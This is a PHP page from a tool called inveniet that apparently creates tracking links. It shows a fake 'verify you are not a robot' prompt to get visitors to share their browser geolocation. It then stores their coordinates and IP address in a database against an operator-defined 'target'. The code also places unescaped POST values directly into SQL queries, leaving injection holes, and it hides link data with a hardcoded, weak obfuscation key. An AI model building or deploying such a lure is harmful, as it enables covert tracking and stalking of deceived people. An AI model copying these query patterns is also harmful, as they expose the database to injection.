<?php

/*
* Copyright (c) 2020 Barchampas Gerasimos <makindosx@gmail.com>.
* inveniet is a program for locating computers tablets and mobile phones.
*
* inveniet is free software: you can redistribute it and/or modify
* it under the terms of the GNU Affero General Public License as
* published by the Free Software Foundation, either version 3 of the
* License, or (at your option) any later version.
*
*
* inveniet is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU Affero General Public License for more details.
*
* You should have received a copy of the GNU Affero General Public License, version 3,
* along with this program.  If not, see <http://www.gnu.org/licenses/>
*
*/

error_reporting(0);

//ini_set('display_errors', 1);
//ini_set('display_startup_errors', 1);
//error_reporting(E_ALL);

require('__DEV__/function.php');
require('__ROOT__/class_cn.php');


 $obj = new security;
 
  $host=$obj->connect[0];
  $user=$obj->connect[1];
  $pass=$obj->connect[2];
  $db=$obj->connect[3];
  
  $conn = new mysqli($host,$user,$pass,$db);
  
  if($conn->connect_error)
     {
     die ("Cannot connect to server " .$conn->connect_error);
       }


else
  {


 function decrypt_url($string) {
    $key = "MAL_979805"; //key to encrypt and decrypts.
    $result = '';
    $string = base64_decode(urldecode($string));
   for($i=0; $i<strlen($string); $i++) {
     $char = substr($string, $i, 1);
     $keychar = substr($key, ($i % strlen($key))-1, 1);
     $char = chr(ord($char)-ord($keychar));
     $result.=$char;
   }
   return $result;
}
    
  
         
$target_bl =  $_SERVER["REMOTE_ADDR"];

$target_st = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

$target_str = substr($target_st, strpos($target_st, "=") + 1); 



$protocol = $_SERVER['SERVER_PORT'];

      if ($protocol == '443')
         {
         $protocol = 'https://';
         }

      else if ($protocol == '80')
           {
           $protocol = 'http://';
           }

        $url = $_SERVER['SERVER_NAME'];

         
        $link_start = $protocol .$url ."view_tar_gro.php?=";
 
        $link_end = decrypt_url($target_str); 
  
        $full_link = $link_start.$link_end;   


       // echo $full_link;

        
     $target_adm = $link_end;
     $target_adm = strstr($target_adm, "!"); //gets all text from needle on
     $target_adm = strstr($target_adm, "-", true); //gets all text before needle
     $target_adm = substr($target_adm, 1); 

 
     $target_targ = $link_end;
     $target_targ = strstr($target_targ, "-"); //gets all text from needle on
     $target_targ = strstr($target_targ, "_", true); //gets all text before needle
     $target_targ = substr($target_targ, 1); 


   //  echo $target_adm ."<br>" .$target_targ;


$sql_block = "select device_id, admin from devices_blocked";
$result_block = $conn->query($sql_block);
              
              
while ($row_block = $result_block->fetch_assoc())
          {
              
           $target_block = $row_block['device_id'];
           $target_admin = $row_block['admin'];
           
          } // end of while
          
          
          if ($target_block == $target_bl && $target_admin == $target_adm)
              {
                exit;  
               }  
               
                  
        else 
          {

?>

<html>
<head>

           <meta charset="utf-8" />
	<link rel="icon" type="image/png" sizes="96x96" href="assets/img/favicon.png">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

       	<title> Inveniet </title> 

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>


<script>
$(document).ready(function(){
    if(navigator.geolocation){
        navigator.geolocation.getCurrentPosition(showLocation);
    }else{ 
        $('#location').html('Geolocation is not supported by this browser.');
    }
});



function showLocation(position)
         {
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;


    var str = "<?php echo $full_link; ?>;";

    var admin = str.split('=').pop();
    var admin = admin.split('!').pop();
    var admin = admin.split('-')[0];

    var target = str.split('=').pop();
    var target = target.split('!').pop();
    var target = target.split('-').pop();
    var target = target.split('_')[0];


    $.ajax({
        type:'POST',
        url:'view_tar_gro.php',
        data:{
             admin : admin, 
             target : target, 
             latitude : latitude,
             longitude : longitude
              },
        success:function(msg)
             {
            if(msg)
              {
               $("#location").html(msg)
                  }
             else
               {
                $("#location").html('Not Available');
                  }
              }
            });
           }



</script>

<style>


/*
body
{
background: url(assets/img/view_back.png);
background-repeat: no-repeat;
background-size:100%;
background-position: 50% 50%; 
}
*/

.blink_me {
  animation: blinker 2s linear infinite;
  color: black;
  font-weight: bold;
  font-size: 30px;
}

@keyframes blinker {
  50% {
    opacity: 0;
  }
}

</style>

</head>

<body>


     <!--

      <p>  <span id="location"></span></p> 

        -->

      
      <div align="center"> 
         <h1> 
           Open your location to verifying you are not a robot and see the content
         </h1> 
         <br>
         <img src="assets/img/view_back.png" height="600" width="600">
      </div> 


</body>
</html>

<?php



  $conn = new mysqli($host,$user,$pass,$db);

$device_id   =  $_SERVER["REMOTE_ADDR"];
$last_ip   =  $_SERVER["REMOTE_ADDR"];

$length = 32;
$fingerprint = substr(str_shuffle(md5(time())), 0, $length);


$admin = $_POST['admin'];
$target_id = $_POST['target'];

//echo $admin ."<br>" .$target_id;

$latitude = $_POST['latitude'];
$longitude = $_POST['longitude'];


$address = "Here";

$all_info = "{ lat: " . $latitude . ", " . "lng: " . $longitude . ", " . "info: " . "''" . "Device Fingerprint: " . $device_id  . " <br> " . "Address: " . $address . "''" . " }"; 

               
    
$sql_mode = "select mode, time_of_renewal from system_settings where mode = 'on' and admin = '$admin'";
$result_mode = $conn->query($sql_mode);

   while ($row_mode = $result_mode->fetch_array(MYSQLI_NUM))
          {
       $mode = $row_mode[0];
       $time_of_renewal = $row_mode[1];
       //$time_of_renewal = floatval($time_of_renewal)
 
           }





$sql_info = "select target_real, target_desc, link from targets_group 
            where admin = '$admin' and target_id = '$target_id'";
$result_info = $conn->query($sql_info);


   while ($row_info = $result_info->fetch_assoc())
          {
           $target_real = $row_info['target_real'];
           $target_desc = $row_info['target_desc'];
           $target_link = $row_info['link'];

           // echo $target_real ."<br>" .$target_desc ."<br>" .$target_link;

           }



 
  if (!empty($admin . $latitude . $longitude))
          {

        $sql_norm_dev = "insert into targets_group (admin, target_id, target_real, target_desc, 
                                                    link, last_ip, instant, latitude, longitude,  
                                                    address, fingerprint, all_info) 
                         values ('$admin', '$target_id', '$target_real', '$target_desc',
                                 '$target_link', '$last_ip', NOW(), '$latitude', '$longitude',
                                 '$address', '$fingerprint', '$all_info')";
  



         $sql_back_dev = "insert into backup_targets_group (admin, target_id, target_real, target_desc, 
                                                   link, last_ip, instant, latitude, longitude,  
                                                    address, fingerprint, all_info) 
                         values ('$admin', '$target_id', '$target_real', '$target_desc',
                                 '$target_link', '$last_ip', NOW(), '$latitude', '$longitude',
                                 '$address', '$fingerprint', '$all_info')";
  



       $result_norm_dev = $conn->query($sql_norm_dev);

       
   
  

       if ($result_norm_dev == true)
           {
            $result_back_dev = $conn->query($sql_back_dev); 
             }


          

           sleep($time_of_renewal);


           } // check for empty fields



        } // end for else block devices
       


} // end of else connect

$conn->close();

?>

